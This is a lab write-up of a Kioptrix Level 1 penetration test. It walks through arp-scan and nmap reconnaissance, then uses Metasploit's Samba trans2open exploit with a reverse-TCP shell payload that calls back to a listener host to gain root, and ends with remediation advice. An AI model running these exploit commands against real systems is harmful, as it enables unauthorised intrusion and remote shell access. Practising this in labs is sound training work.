# Kioptrixlv1-hacking
This is a hacking lab on kioptrix vulnerable lab.
### Kioptrix: Level 1 - Penetration Testing Write-Up

## Executive Summary

Kioptrix Level 1 is a beginner-level vulnerable virtual machine designed to acquire basic penetration testing skills. The objective is to gain root access to the target system.

---

## 1. Host Discovery
The target machine was located on the local network using `arp-scan`.

```bash
sudo arp-scan -l

```

<img width="1920" height="856" alt="netdiscovery" src="https://github.com/user-attachments/assets/2f34cf5a-32f1-4a73-b3ee-5c6edfae06e1" />

*Figure 1: `arp-scan` output identifying the target IP address `10.0.2.5`.*

---

## 2. Service Enumeration

An aggressive Nmap scan was conducted to discover open ports, running services, and underlying OS versions.

```bash
sudo nmap -p- -sS -sV -sC 10.0.2.5

```

<img width="1920" height="856" alt="nmap-scan" src="https://github.com/user-attachments/assets/2a90a142-1989-448b-9c30-bf8732fcfccb" />

*Figure 2: Nmap results revealing active services: SSH (22), HTTP (80), Samba/NetBIOS (139), and HTTPS (443).*

### Key Discoveries:

* **Web Server:** Apache 1.3.20 running on Red Hat Linux with `mod_ssl/2.8.4`
* **File Sharing:** Samba `smbd` (Workgroup: `MYGROUP`)

---

## 3. Web Reconnaissance

Visiting the target's IP address (`http://10.0.2.5/`) via browser confirmed a standard Apache web server installation page.

<img width="1922" height="858" alt="webpage" src="https://github.com/user-attachments/assets/94e6cc16-b365-4f9c-80e8-427af96e26ce" />

*Figure 3: Default Apache landing page.*

---

## 4. Vulnerability Assessment & Metasploit Lookup

Searching Metasploit for known vulnerabilities in older Samba distributions (`2.2.x`).

```bash
msfconsole
msf6 > search samba

```

<img width="1920" height="856" alt="use-metaploit" src="https://github.com/user-attachments/assets/3a8afc9d-c3f4-4e51-bf40-90013276d1bf" />

*Figure 4: Locating the `exploit/linux/samba/trans2open` module.*

---

## 5. Exploitation

Selecting and configuring the `trans2open` buffer overflow exploit along with a reverse shell payload.

```bash
use exploit/linux/samba/trans2open
set RHOSTS 10.0.2.5
set payload generic/shell_reverse_tcp
set LHOST 10.0.2.3
set LPORT 4444
run

```

<img width="1920" height="856" alt="exploit" src="https://github.com/user-attachments/assets/9f76a971-13c8-4c6e-a18b-1bde249a0add" />

*Figure 5: Setting exploit targets, payload, and listener options.*

---

## 6. Root Access & Verification

Executing the exploit successfully established a reverse command shell with full root-level privileges.

```bash
whoami
# root

pwd
# /

```

<img width="1920" height="856" alt="hacked" src="https://github.com/user-attachments/assets/000f2a2d-5432-434d-be9b-ef396b26577d" />

*Figure 6: Interactive root shell session established on the target.*

---

## Remediation & Mitigation Strategies

1. **Patch & Upgrade Samba:** Upgrade Samba to a modern, supported version (4.x series) to remediate the `trans2open` buffer overflow vulnerability.
2. **Upgrade Web Infrastructure:** Update Apache and OpenSSL to stable modern releases to patch legacy `mod_ssl` vulnerabilities and disable weak protocols (SSLv2/SSLv3).
3. **Network Filtering:** Restrict access to SMB/NetBIOS ports (`139`/`445`) via host-based and network firewalls so only designated endpoints can communicate with file services.
